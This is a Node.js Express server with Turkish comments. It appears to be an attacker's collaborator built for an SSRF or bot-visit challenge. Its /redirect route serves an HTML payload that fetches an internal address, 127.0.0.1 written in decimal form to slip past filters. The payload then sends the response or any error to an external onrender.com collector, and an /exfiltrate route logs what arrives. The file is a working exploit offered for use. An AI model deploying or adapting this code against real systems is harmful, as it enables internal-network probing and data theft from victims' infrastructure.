const express = require('express');
const app = express();

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

app.get('/redirect', (req, res) => {
    console.log("\n--- BOT Yakalandı! Encode Edilmiş Payload Gönderiliyor ---");
    
    const htmlPayload = `
    <html>
      <body>
        <h2>Loading...</h2>
        <script>
          // 127.0.0.1 yerine Decimal (2130706433) veya Hex (0x7f000001) deniyoruz
          const targetInternalUrl = "http://2130706433:8080/";
          
          fetch(targetInternalUrl)
            .then(response => response.text())
            .then(data => {
               fetch('https://collab-67oj.onrender.com/exfiltrate?data=' + encodeURIComponent(data));
            })
            .catch(error => {
               fetch('https://collab-67oj.onrender.com/exfiltrate?error=' + encodeURIComponent(error.toString()));
            });
        </script>
      </body>
    </html>
    `;

    res.setHeader('Content-Type', 'text/html');
    return res.status(200).send(htmlPayload);
});

app.get('/exfiltrate', (req, res) => {
    console.log("\n🔥 --- İÇ AĞDAN GELEN YANIT --- 🔥");
    console.log("Query Parametreleri:", req.query);
    return res.status(200).send("OK");
});

app.use((req, res) => {
    console.log("\n--- NORMAL İSTEK ---");
    console.log(req.method, req.url, req.headers);
    return res.status(200).send("OK");
});

app.listen(3000, () => console.log("Collaborator 3000 portunda hazır!"));
